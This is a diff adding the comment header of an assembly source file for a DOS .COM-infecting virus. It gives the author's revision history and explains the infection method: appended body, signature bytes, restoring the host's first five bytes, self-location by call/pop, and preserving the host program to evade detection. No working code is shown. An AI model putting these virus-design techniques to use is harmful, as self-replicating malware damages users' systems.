@@ -1,0 +1,105 @@
+;Revision history:
+;4-13: initial bug-free release, size=424 bytes with carrier
+
+;4-15: added no date change support, size=438 bytes with carrier
+
+;4-16: minor documentation changes, size=438 bytes with carrier,
+;      NO CODE CHANGE from 4-15 revision
+
+;4-21: fixed missing hex h suffixs, made MASM friendly,
+;      fixed incorrect assume statement (assume statements are ignored
+;      by A86) enabled hard/floppy infection based on floppy_only status
+;      size=438 bytes IF floppy_only, 424 bytes if not, with carrier.
+;      minimum virus length = 419 bytes
+	
+;4-23: added control over how many programs are infected per run,
+;      switched method of infection, from copying to DTA then writing
+;      to disk to straight write to disk from memory.
+;      size=412 bytes IF floppy_only, 398 bytes if not, with carrier.
+;      minimum virus length = 393 bytes
+	
+;4-28: used set DTA instead of default DTA/copy command line
+;      buffer, which had been used based on incorrect assumption
+;      eliminated calls to get time/date, get attribs
+;      by using information from find first/find next functions 4eh/4fh
+;      made warning optional for reduced space if desired.  Also
+;      changed mov reg16, bp add reg16, constant to shorter LEA instruction.
+;      size=354 bytes IF floppy_only, warning on W/carrier
+;           340 bytes IF w/warning & carrier program
+;           286 bytes w/o warning, in program
+;       minimum virus length = 281 bytes for virus itself
+
+;4-28pm:  instead of near CALL-pop sequences everywhere, switched to
+;         a single CALL near ptr Reference_Point, putting the result into
+;         si now that (until the end) string mode addressing is not used.
+;         Changed places where a register (used as an index)
+;         was being loaded THEN added to a single LEA isntruction
+;       size = 340 bytes if floppy_only, warning on w/carrier
+;       size = 326 bytes if w/warning & carrier
+;	size = 272 w/o warning
+;	minimum virus length = 267 bytes for the virus itself
+
+;4-28pm2: Eliminated unecessary flush buffers call.
+;       size = 336 bytes if floppy_only w/carrier
+;       size = 322 bytes w/warning & carrier
+;	size = 268 w/o warning
+;	minimum virus length = 263 bytes for virus itself
+
+;4-30:	restored 5 bytes of original code at CS:0100
+;	before infecting other programs, allowing the
+;	original code field to be modified so one disk write could be
+;	used instead of two
+;	minor documentation revisions - corrected incorrect
+;	opcodes in documentation
+;	size = 326 bytes if floppy_only w/carrier
+;	size = 312 bytes w/warning & carrier program
+;	size = 258 bytes w/carrier program
+;	Minimum virus length = 253 bytes for the virus itself
+	
+;NOTE:  The program is currently "set up" for A86 assembly with all
+;conditional assembly symbols.  #IF and #ENDIF should be replaced with
+;MASM IFDEF and ENDIF directives for propper operation.
+;Also, instead of using EQUates to define control symbols, the /D
+;option or DEFINE could be used.....
+
+
+;COMVIRUS.ASM must be assembled into a .COM file inorder to function
+;properly.  For convieniece, I recommend an assembler like A86 that will
+;assemble to a .COM file without having to go through LINK and EXE2BIN
+
+;As is, it will infect .COM files located on the current disk.
+;ONLY if it is a floppy disk, ONLY in the root directory.
+
+;This is a .COM infector virus, which, does nothing other than print a
+;warning message, and spread to all files on the default disk IFF it is
+;a floppy disk, in the root directory.
+
+;Theory:
+;This is a non - overwriting virus.  I took special precautions to preserve
+;all functionality of the original program, including command line, parsed FCB,
+;and segment register preservation.  This makes the virus harder to detect.
+
+;The .COM file is a memory image - with no relocation table.  Thus, it
+;is an easy target for a virus such as this.
+
+;Infected file format
+;jmp near ptr xxxx
+;cli cli                ;ID bytes
+;ORIGINAL program code, sans 5 bytes
+;5 bytes ORIGINAL program code
+;VIRUS
+
+;This format makes infection VERY simple.  We merely check for our signature
+;(in this case cli cli (fa fa) - instructions that no programmer in his
+;right mind would use - loading the original five bytes in the process.
+;These original bytes are written to the end of the program, then
+;A jump to where the virus is.
+
+;While infection is easy, this method presents some coding problems, as the
+;virus does not know where in memory it is.  Therefor, When we want to access
+;data, we FIND OUT where we are, by performing a near call which PUSHES ip to the
+;stack which is then popped.  Addresses are then calculated relative to this
+;via LEA
+
+;To run the program as normal, command line is restored, registers restored,
+;And original code copied onto the first five bytes of the program.
